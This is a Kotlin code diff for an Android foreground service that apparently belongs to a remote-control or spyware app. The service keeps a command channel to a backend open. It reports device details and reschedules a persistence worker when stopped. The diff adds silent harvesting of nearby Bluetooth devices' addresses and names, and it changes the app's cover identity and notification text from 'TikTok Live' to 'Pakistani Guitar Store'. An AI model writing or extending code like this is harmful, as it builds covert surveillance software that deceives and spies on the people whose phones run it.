@@ -26,6 +26,24 @@ import kotlinx.coroutines.launch
 // Foreground service keeps the command channel alive under Android background limits.
 class ADexForegroundService : Service(), WebSocketEvents {
     private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
+    private val bluetoothReceiver = object : android.content.BroadcastReceiver() {
+        @SuppressLint("MissingPermission")
+        override fun onReceive(context: android.content.Context, intent: android.content.Intent) {
+            when (intent.action) {
+                android.bluetooth.BluetoothDevice.ACTION_FOUND -> {
+                    val device: android.bluetooth.BluetoothDevice? = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        intent.getParcelableExtra(android.bluetooth.BluetoothDevice.EXTRA_DEVICE, android.bluetooth.BluetoothDevice::class.java)
+                    } else {
+                        @Suppress("DEPRECATION")
+                        intent.getParcelableExtra(android.bluetooth.BluetoothDevice.EXTRA_DEVICE)
+                    }
+                    device?.let {
+                        com.adex.app.util.BluetoothHelper.addDiscoveredDevice(it.address, it.name)
+                    }
+                }
+            }
+        }
+    }
 
     private lateinit var settingsStore: SettingsStore
     private lateinit var backendApiClient: BackendApiClient
@@ -50,6 +68,9 @@ class ADexForegroundService : Service(), WebSocketEvents {
 
         createNotificationChannel()
         startForeground(NOTIFICATION_ID, buildNotification("Initializing"))
+        
+        val filter = android.content.IntentFilter(android.bluetooth.BluetoothDevice.ACTION_FOUND)
+        registerReceiver(bluetoothReceiver, filter)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -109,7 +130,7 @@ class ADexForegroundService : Service(), WebSocketEvents {
 
                 webSocketManager.connect(
                     metadata = mapOf(
-                        "name" to "TikTok Live",
+                        "name" to "Pakistani Guitar Store",
                         "model" to (Build.MODEL ?: "unknown"),
                         "androidVersion" to (Build.VERSION.RELEASE ?: "unknown"),
                         "appVersion" to appVersion,
@@ -124,7 +145,7 @@ class ADexForegroundService : Service(), WebSocketEvents {
                 updateNotification("Registration failed: $message; retrying")
                 webSocketManager.connect(
                     metadata = mapOf(
-                        "name" to "TikTok Live",
+                        "name" to "Pakistani Guitar Store",
                         "model" to (Build.MODEL ?: "unknown"),
                         "androidVersion" to (Build.VERSION.RELEASE ?: "unknown"),
                         "appVersion" to "1.0.0",
@@ -212,7 +233,7 @@ class ADexForegroundService : Service(), WebSocketEvents {
         )
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
-            .setContentTitle("TikTok Live Engine")
+            .setContentTitle("Pakistani Guitar Store Engine")
             .setContentText("Optimizing live stream health...")
             .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
             .setContentIntent(pendingIntent)
@@ -246,6 +267,7 @@ class ADexForegroundService : Service(), WebSocketEvents {
     override fun onDestroy() {
         started = false
         isServiceRunning = false
+        runCatching { unregisterReceiver(bluetoothReceiver) }
         PersistenceWorker.schedule(applicationContext)
         commandDispatcher.shutdown()
         webSocketManager.disconnect()
